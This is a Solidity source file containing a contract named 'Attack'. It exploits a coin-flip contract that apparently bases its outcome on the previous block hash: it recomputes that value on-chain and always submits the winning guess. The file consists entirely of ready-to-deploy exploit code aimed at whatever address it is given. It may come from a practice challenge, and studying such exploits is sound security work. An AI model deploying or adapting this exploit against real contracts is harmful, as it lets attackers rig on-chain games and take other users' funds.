// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface IConFlip{
    function flip(bool _guess) external returns (bool);
}

contract Attack{
    using SafeMath for uint256;
    IConFlip public iConFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address conFlipAddress){
        iConFlip = IConFlip(conFlipAddress);
    }

    function attack() public returns (bool){
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        bool success = iConFlip.flip(side);
        return success;
    }

}

